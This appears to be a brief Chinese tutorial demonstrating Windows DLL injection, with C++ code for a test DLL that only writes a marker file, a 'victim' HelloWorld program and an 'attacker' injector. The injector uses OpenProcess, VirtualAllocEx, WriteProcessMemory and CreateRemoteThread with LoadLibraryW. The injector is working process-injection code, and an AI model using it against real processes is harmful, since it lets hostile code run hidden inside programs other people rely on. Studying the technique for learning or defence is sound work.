参考：https://www.cnblogs.com/predator-wang/p/5076279.html


### 要注入的DLL：

```c++
// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    //hInst = (HINSTANCE)hModule;
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)    //当一个DLL被进程加载时，所要执行的功能
    {
        HANDLE f = CreateFile(L"D:\\InjectSuccess.txt", FILE_ADD_FILE, FILE_SHARE_WRITE,
            NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
        CloseHandle(f);
        //hInst = (HINSTANCE)hModule;
    }
    return TRUE;
}
```

### 受害者（被注入的进程）

```c++
#include <iostream>

using namespace std;

int main()
{
    cout << "HelloWorld" << endl;
    system("pause");
    return 0;
}
```

### 施害者（恶意程序）

其中OpenProcess函数的最后一个参数要用tasklist命令得到。

```c++
#include <iostream>
#include <windows.h>
using namespace std;

int main()
{
    LPDWORD lpThreadId = nullptr;
    LPWSTR lpszLibName = (LPWSTR)L"D:\\Coding\\test\\InjectDLL\\InjectDLL\\Debug\\InjectDll.dll";
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, 10756);
    //cout << hProcess << endl;
    LPWSTR lpszRemoteFile = (LPWSTR)VirtualAllocEx(hProcess, NULL, sizeof(WCHAR) * lstrlenW(lpszLibName) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, lpszRemoteFile, (PVOID)lpszLibName, sizeof(WCHAR) * lstrlenW(lpszLibName) + 1, NULL);
    cout << lpszRemoteFile << endl;
    HMODULE hMod = GetModuleHandle(L"kernel32.dll");
    PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(hMod, "LoadLibraryW");
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn,
        lpszRemoteFile,
        0, lpThreadId);
    cout << hThread << endl;
    system("pause");
    return 0;
}
```